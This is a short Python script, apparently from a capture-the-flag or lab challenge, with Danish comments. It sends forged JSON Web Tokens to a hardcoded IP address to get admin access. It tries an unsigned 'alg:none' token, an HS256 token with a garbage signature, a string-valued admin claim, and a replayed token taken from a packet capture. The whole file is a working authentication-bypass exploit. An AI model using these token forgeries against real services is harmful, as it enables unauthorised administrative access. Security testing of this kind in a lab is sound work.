#!/usr/bin/env python3
import base64, json, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

SS = "77.74.147.54"
HOST = "secret-server.hkn"

def test(jwt, desc):
    print(f"\n### {desc} ###")
    print(f"JWT: {jwt}")
    r = requests.get(f"http://{SS}/next_chars?char=s", headers={"Host": HOST, "JWT": jwt}, timeout=5)
    print(f"  -> {r.status_code}: {r.text[:200]}")

# 1) alg:none, admin:true, ingen signatur
h1 = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
p1 = b64url(json.dumps({"admin":True,"timestamp":1300000000}, separators=(',',':')).encode())
test(f"{h1}.{p1}.", "alg:none, tom signatur")

# 2) alg:HS256 men garbage signatur, admin:true
h2 = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
p2 = b64url(json.dumps({"admin":True,"timestamp":1300000000}, separators=(',',':')).encode())
test(f"{h2}.{p2}.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "HS256, garbage signatur")

# 3) admin som streng "True" (ikke bool) - truthy-bug, ingen signatur
p3 = b64url(json.dumps({"admin":"True","timestamp":1300000000}, separators=(',',':')).encode())
test(f"{h1}.{p3}.", "alg:none, admin streng 'True'")

# 4) Kendt JWT2 fra pcap (admin:true boolean, gammel signatur) - genbekraeft om den virker her
JWT2 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoxMzAwMDAwMDAwfQ.d-H00PqEmUozSDiQxSRWBYeyIqvuaTifVVBHlKaE2Wc"
test(JWT2, "Kendt JWT2 fra pcap (admin:true)")
